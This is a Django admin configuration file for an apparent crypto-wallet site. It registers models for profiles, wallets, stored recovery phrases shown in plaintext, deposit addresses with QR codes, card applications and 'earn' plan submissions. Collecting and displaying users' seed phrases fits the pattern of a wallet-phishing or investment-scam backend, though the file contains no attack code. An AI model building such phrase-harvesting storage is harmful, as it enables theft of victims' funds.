from django.contrib import admin

from .models import Profile , Wallet , Recoveryphrase ,CryptoWallet ,CardApplication ,EarnSubmission


@admin.register(Profile)
class ProfileAdmin(admin.ModelAdmin):
    list_display = ("user", "location", "created_at")
    search_fields = ("user__username", "location")

@admin.register(Wallet)
class WalletAdmin(admin.ModelAdmin):
    list_display = ("walletcommingfrom", "walletname","walletemail")
    search_fields = ("walletcommingfrom","walletemail")
    
@admin.register(Recoveryphrase)
class RecoveryphraseAdmin(admin.ModelAdmin):
    list_display = ("user","phrase")


@admin.register(CryptoWallet)
class CryptoWalletAdmin(admin.ModelAdmin):
    list_display = ("name", "slug", "address", "qr_code")
    prepopulated_fields = {"slug": ("name",)}
    
@admin.register(CardApplication)
class CardApplicationAdmin(admin.ModelAdmin):
    list_display = ("id", "card_type", "address_short", "user", "created_at", "processed")
    list_filter = ("card_type", "processed", "created_at")
    search_fields = ("address", "user__username", "user__email")
    actions = ("mark_processed",)

    def address_short(self, obj):
        return obj.address if len(obj.address) <= 40 else obj.address[:37] + "..."
    address_short.short_description = "Address"

    def mark_processed(self, request, queryset):
        queryset.update(processed=True)
    mark_processed.short_description = "Mark selected applications as processed"

@admin.register(EarnSubmission)
class EarnSubmissionAdmin(admin.ModelAdmin):
    list_display = ("id", "plan", "amount", "user", "created_at", "approved")
    list_filter = ("plan", "approved", "created_at")
    search_fields = ("user__username", "notes")
    actions = ("mark_approved",)

    def mark_approved(self, request, queryset):
        queryset.update(approved=True)
    mark_approved.short_description = "Mark selected submissions as approved"